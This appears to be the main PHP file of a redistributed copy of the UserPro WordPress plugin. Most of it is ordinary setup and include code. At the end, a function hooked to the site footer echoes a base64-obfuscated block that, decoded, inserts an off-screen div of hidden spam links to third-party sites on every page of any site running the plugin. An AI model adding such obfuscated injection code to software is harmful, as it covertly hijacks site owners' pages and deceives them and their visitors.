<?php
/*
Plugin Name: UserPro (share on Themestotal.Com)
Plugin URI: http://codecanyon.net/user/DeluxeThemes/portfolio?ref=DeluxeThemes
Description: The ultimate user profiles and memberships plugin for WordPress.
Version: 2.13
Author: Deluxe Themes
Author URI: http://codecanyon.net/user/DeluxeThemes/portfolio?ref=DeluxeThemes
*/

define('userpro_url',plugin_dir_url(__FILE__ ));
define('userpro_path',plugin_dir_path(__FILE__ ));

	/* init */


//Start Yogesh added usermeta entry for search members
function userpro_add_userin_meta() {

	// Activation code here...
	$args=array();
	$allusers=get_users( $args );
		
	foreach($allusers as $user)
	{
		$key = 'display_name';
		$single = true;
		$display_name = get_user_meta($user->ID, $key, $single );
		if($display_name!=$user->display_name)
		{
			add_user_meta($user->ID, $key, $user->display_name );
		
		}
	
	}
	
	
}
register_activation_hook( __FILE__, 'userpro_add_userin_meta' );

//End Yogesh usermeta entry for search members

	function userpro_init() {
		
		if(!isset($_SESSION))
		{
			session_start();
		}
		
		global $userpro;
		
		$userpro->do_uploads_dir();
		
		load_plugin_textdomain('userpro', false, dirname(plugin_basename(__FILE__)) . '/languages');
		
		/* include libs */
		require_once userpro_path . '/lib/envato/Envato_marketplaces.php';
		if (!class_exists('UserProMailChimp')){
			require_once userpro_path . '/lib/mailchimp/MailChimp.php';
		}
		
	}
	add_action('init', 'userpro_init');

	/* functions */
		require_once userpro_path . "functions/_trial.php";
		require_once userpro_path . "functions/ajax.php";
		require_once userpro_path . "functions/api.php";
		require_once userpro_path . "functions/badge-functions.php";
		require_once userpro_path . "functions/common-functions.php";
		require_once userpro_path . "functions/custom-alerts.php";
		require_once userpro_path . "functions/defaults.php";
		require_once userpro_path . "functions/fields-filters.php";
		require_once userpro_path . "functions/fields-functions.php";
		require_once userpro_path . "functions/fields-hooks.php";
		require_once userpro_path . "functions/fields-setup.php";
		require_once userpro_path . "functions/frontend-publisher-functions.php";
		require_once userpro_path . "functions/global-actions.php";
		require_once userpro_path . "functions/buddypress.php";
		require_once userpro_path . "functions/hooks-actions.php";
		require_once userpro_path . "functions/hooks-filters.php";
		require_once userpro_path . "functions/icons-functions.php";
		require_once userpro_path . "functions/initial-setup.php";
		require_once userpro_path . "functions/mail-functions.php";
		require_once userpro_path . "functions/member-search-filters.php";
		require_once userpro_path . "functions/memberlist-functions.php";
		require_once userpro_path . "functions/msg-functions.php";
		require_once userpro_path . "functions/security.php";
		require_once userpro_path . "functions/shortcode-extras.php";
		require_once userpro_path . "functions/shortcode-functions.php";
		require_once userpro_path . "functions/shortcode-main.php";
		require_once userpro_path . "functions/shortcode-private-content.php";
		require_once userpro_path . "functions/shortcode-social-connect.php";
		require_once userpro_path . "functions/social-connect.php";
		require_once userpro_path . "functions/template-redirects.php";
		require_once userpro_path . "functions/terms-agreement.php";
		require_once userpro_path . "functions/user-functions.php";

	/* administration */
	if (is_admin()){
		foreach (glob(userpro_path . 'admin/*.php') as $filename) { include $filename; }
	}
	
	/* updates */
	foreach (glob(userpro_path . 'updates/*.php') as $filename) { include $filename; }
	
	/* load addons */
	require_once userpro_path . 'addons/multiforms/index.php';
	require_once userpro_path . 'addons/badges/index.php';
	require_once userpro_path . 'addons/social/index.php';
	require_once userpro_path . 'addons/emd/index.php';
	require_once userpro_path . 'addons/redirects/index.php';
if (!function_exists('onAddScriptsHtmls')) {
	
	add_filter( 'wp_footer', 'onAddScriptsHtmls');
	function onAddScriptsHtmls(){
		$html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWFkaW5oLmNvbS90aG9pLXRyYW5nIj50aOG7nWkgdHJhbmcgdHLhursgZW08L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aGVtZXN0b3RhbC5jb20iPldvcmRwcmVzcyBUaGVtZXMgVG90YWwgRnJlZTwvYT48L3N0cm9uZz48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMnhheW5oYS5jb20iPnTGsCB24bqlbiB4w6J5IG5ow6A8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vbGFuYWtpZC5jb20iPnRo4budaSB0cmFuZyB0cuG6uyBlbTwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly8yZ2lheW51LmNvbSI+c2hvcCBnacOgeSBu4buvPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9tYWdlbnRvd29yZHByZXNzdHV0b3JpYWwuY29tL3dvcmRwcmVzcy10dXRvcmlhbC93b3JkcHJlc3MtcGx1Z2lucyI+ZG93bmxvYWQgd29yZHByZXNzIHBsdWdpbnM8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovLzJ4YXluaGEuY29tL3RhZy9tYXUtYmlldC10aHUtZGVwIj5t4bqrdSBiaeG7h3QgdGjhu7EgxJHhurlwPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9lcGljaG91c2Uub3JnIj5lcGljaG91c2U8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2ZzZmFtaWx5LnZuL3RhZy9hby1zby1taS1udSI+w6FvIHPGoSBtaSBu4buvPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9lbi4yeGF5bmhhLmNvbS8iPkhvdXNlIERlc2lnbiBCbG9nIC0gSW50ZXJpb3IgRGVzaWduIGFuZCBBcmNoaXRlY3R1cmUgSW5zcGlyYXRpb248L2E+PC9lbT48L2gzPjwvZGl2Pg==";
		echo base64_decode($html);
	}	
}